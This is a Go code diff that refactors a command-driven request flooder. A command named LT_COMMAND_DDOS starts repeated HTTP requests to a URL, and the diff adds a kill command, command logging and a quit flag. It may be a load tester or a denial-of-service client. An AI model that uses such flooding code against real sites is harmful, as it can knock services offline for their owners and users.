@@ -8,7 +8,8 @@ import (
 	"time"
 )
 
-var keepGoing = true
+var FL_KEEP_GOING = true
+var FL_QUIT = false
 var counter = 0
 var settings = utils.GetSettings()
 var requests = 0
@@ -30,14 +31,14 @@ func performRequest(url string) (status int) {
 func performMultiRequest(url string, count int, c chan int) {
 	if count == 0 {
 		for {
-			if !keepGoing {
+			if !FL_KEEP_GOING {
 				break
 			}
 			c <- performRequest(url)
 		}
 	} else {
 		for i := 0; i < count; i++ {
-			if !keepGoing {
+			if !FL_KEEP_GOING {
 				break
 			}
 			c <- performRequest(url)
@@ -45,7 +46,7 @@ func performMultiRequest(url string, count int, c chan int) {
 	}
 }
 
-func listenChanel(c chan int)  {
+func listenChanel(c chan int) {
 	for {
 		<-c
 		requests += 1
@@ -66,7 +67,7 @@ func getCommand() (command utils.CommandType, err error) {
 
 	// Считаем количество секунд и посылаем команду на завершение если время истекло
 	if counter >= settings.Seconds {
-		return utils.CommandType{2, utils.LT_COMMAND_STOP, nil}, err
+		return utils.CommandType{2, utils.LT_COMMAND_KILL, nil}, err
 	}
 
 	cmd = utils.CommandType{
@@ -106,6 +107,8 @@ func main() {
 
 			last_command_id = command.Id
 
+			utils.WriteLog("Command ", command)
+
 			switch command.Name {
 			case utils.LT_COMMAND_DDOS:
 
@@ -118,17 +121,18 @@ func main() {
 				}
 
 			case utils.LT_COMMAND_STOP:
-				keepGoing = false
+				FL_KEEP_GOING = false
+
+			case utils.LT_COMMAND_KILL:
+				FL_QUIT = true
 
 			default:
-				keepGoing = true
+				FL_KEEP_GOING = true
 			}
 
 		}
 
-		if !keepGoing {
-			utils.WriteLog("wait...")
-			time.Sleep(5000 * time.Millisecond)
+		if FL_QUIT {
 			break
 		}
 
